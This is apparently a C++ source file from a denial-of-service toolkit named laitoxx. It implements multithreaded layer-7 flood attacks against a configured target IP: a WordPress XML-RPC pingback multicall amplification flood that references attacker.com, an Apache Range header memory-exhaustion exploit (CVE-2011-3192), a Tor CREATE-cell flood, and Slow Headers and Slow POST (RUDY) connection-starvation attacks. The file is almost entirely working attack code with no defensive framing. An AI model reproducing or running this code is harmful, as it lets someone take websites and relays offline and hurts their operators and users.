#include "l7_application.h"
#include <sstream>
#include <random>
#include <chrono>
#include <cstring>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <fcntl.h>
#endif

namespace laitoxx {

// Utility
static std::string random_string(size_t length) {
    static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }
    return result;
}

// ============================================================================
// WordPress XML-RPC
// ============================================================================

void WordPressXMLRPC::start() {
    log("Starting WordPress XML-RPC pingback flood");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&WordPressXMLRPC::attack_worker, this);
    }
}

std::string WordPressXMLRPC::build_xmlrpc_pingback(const std::string& target_url) {
    std::stringstream ss;
    ss << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
       << "<methodCall>\n"
       << "  <methodName>pingback.ping</methodName>\n"
       << "  <params>\n"
       << "    <param>\n"
       << "      <value><string>" << target_url << "</string></value>\n"
       << "    </param>\n"
       << "    <param>\n"
       << "      <value><string>http://" << config_.target_ip << "/</string></value>\n"
       << "    </param>\n"
       << "  </params>\n"
       << "</methodCall>";

    return ss.str();
}

std::string WordPressXMLRPC::build_xmlrpc_multicall() {
    std::stringstream ss;
    ss << "<?xml version=\"1.0\"?>\n"
       << "<methodCall>\n"
       << "  <methodName>system.multicall</methodName>\n"
       << "  <params>\n"
       << "    <param>\n"
       << "      <value>\n"
       << "        <array>\n"
       << "          <data>\n";

    // Add many pingback calls
    for (int i = 0; i < 1000; ++i) {
        ss << "            <value>\n"
           << "              <struct>\n"
           << "                <member>\n"
           << "                  <name>methodName</name>\n"
           << "                  <value><string>pingback.ping</string></value>\n"
           << "                </member>\n"
           << "                <member>\n"
           << "                  <name>params</name>\n"
           << "                  <value>\n"
           << "                    <array>\n"
           << "                      <data>\n"
           << "                        <value><string>http://attacker.com/" << i << "</string></value>\n"
           << "                        <value><string>http://" << config_.target_ip << "/</string></value>\n"
           << "                      </data>\n"
           << "                    </array>\n"
           << "                  </value>\n"
           << "                </member>\n"
           << "              </struct>\n"
           << "            </value>\n";
    }

    ss << "          </data>\n"
       << "        </array>\n"
       << "      </value>\n"
       << "    </param>\n"
       << "  </params>\n"
       << "</methodCall>";

    return ss.str();
}

void WordPressXMLRPC::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 80);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // Use multicall for amplification
            std::string body = build_xmlrpc_multicall();

            std::stringstream request;
            request << "POST /xmlrpc.php HTTP/1.1\r\n"
                   << "Host: " << config_.target_ip << "\r\n"
                   << "Content-Type: application/xml\r\n"
                   << "Content-Length: " << body.length() << "\r\n"
                   << "\r\n"
                   << body;

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
    }
}

// ============================================================================
// Apache Range Header Exploit (CVE-2011-3192)
// ============================================================================

void ApacheRangeExploit::start() {
    log("Starting Apache Range header exploit (CVE-2011-3192)");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&ApacheRangeExploit::attack_worker, this);
    }
}

std::string ApacheRangeExploit::build_range_request(int num_ranges) {
    std::stringstream ss;
    ss << "GET / HTTP/1.1\r\n"
       << "Host: " << config_.target_ip << "\r\n"
       << "Range: bytes=";

    for (int i = 0; i < num_ranges; ++i) {
        if (i > 0) ss << ",";
        ss << "0-1";
    }

    ss << "\r\n"
       << "User-Agent: Mozilla/5.0\r\n"
       << "\r\n";

    return ss.str();
}

void ApacheRangeExploit::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 80);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // CVE-2011-3192: Many byte ranges cause memory exhaustion
            std::string request = build_range_request(1000);
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }

        close(sock);
    }
}

// ============================================================================
// TOR Flood
// ============================================================================

void TORFlood::start() {
    log("Starting TOR circuit creation flood");
    log("Note: Requires TOR network access");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&TORFlood::attack_worker, this);
    }
}

std::vector<char> TORFlood::build_tor_cell(uint8_t command) {
    std::vector<char> cell(512); // TOR cells are 512 bytes

    // Circuit ID (2 bytes)
    cell[0] = (rand() >> 8) & 0xFF;
    cell[1] = rand() & 0xFF;

    // Command (1 byte)
    cell[2] = command;

    // Payload (509 bytes)
    for (int i = 3; i < 512; ++i) {
        cell[i] = rand() & 0xFF;
    }

    return cell;
}

std::vector<char> TORFlood::build_create_circuit() {
    // CREATE or CREATE2 cell (command 1 or 10)
    return build_tor_cell(10);
}

bool TORFlood::perform_tor_handshake(int sock) {
    // Simplified TOR handshake (versions negotiation)
    // Real TOR handshake is more complex

    // Send VERSIONS cell (command 7)
    std::vector<char> versions = build_tor_cell(7);
    send(sock, versions.data(), versions.size(), 0);

    // Receive response (simplified, skip parsing)
    char buffer[512];
    recv(sock, buffer, sizeof(buffer), 0);

    return true;
}

void TORFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 9001);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // Perform handshake
            if (perform_tor_handshake(sock)) {
                // Flood with CREATE cells
                for (int i = 0; i < 100 && !stop_flag_; ++i) {
                    auto cell = build_create_circuit();
                    send(sock, cell.data(), cell.size(), 0);
                    packets_sent_++;
                }
            }
        }

        close(sock);
    }
}

// ============================================================================
// Slow Headers
// ============================================================================

void SlowHeaders::start() {
    log("Starting Slow HTTP Headers attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&SlowHeaders::attack_worker, this);
    }
}

void SlowHeaders::send_partial_header(int sock) {
    // Send initial request line
    std::string initial = "GET / HTTP/1.1\r\n";
    send(sock, initial.c_str(), initial.length(), 0);

    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    // Keep sending partial headers slowly
    int header_num = 0;
    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        std::stringstream ss;
        ss << "X-Header-" << header_num++ << ": " << random_string(20) << "\r\n";
        std::string header = ss.str();

        if (send(sock, header.c_str(), header.length(), 0) <= 0) {
            break;
        }

        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
}

void SlowHeaders::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 80);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            send_partial_header(sock);
            packets_sent_++;
        }

        close(sock);
    }
}

// ============================================================================
// Slow POST (R-U-Dead-Yet / RUDY)
// ============================================================================

void SlowPOST::start() {
    log("Starting Slow POST attack (RUDY)");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&SlowPOST::attack_worker, this);
    }
}

void SlowPOST::send_slow_post(int sock) {
    // Send headers with large Content-Length
    std::stringstream headers;
    headers << "POST / HTTP/1.1\r\n"
           << "Host: " << config_.target_ip << "\r\n"
           << "Content-Type: application/x-www-form-urlencoded\r\n"
           << "Content-Length: 1000000\r\n"
           << "\r\n";

    std::string hdr = headers.str();
    send(sock, hdr.c_str(), hdr.length(), 0);

    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    // Send body very slowly (1 byte per 10 seconds)
    int bytes_sent = 0;
    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration &&
           bytes_sent < 1000000) {

        char byte = 'A';
        if (send(sock, &byte, 1, 0) <= 0) {
            break;
        }
        bytes_sent++;

        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
}

void SlowPOST::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 80);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            send_slow_post(sock);
            packets_sent_++;
        }

        close(sock);
    }
}

} // namespace laitoxx
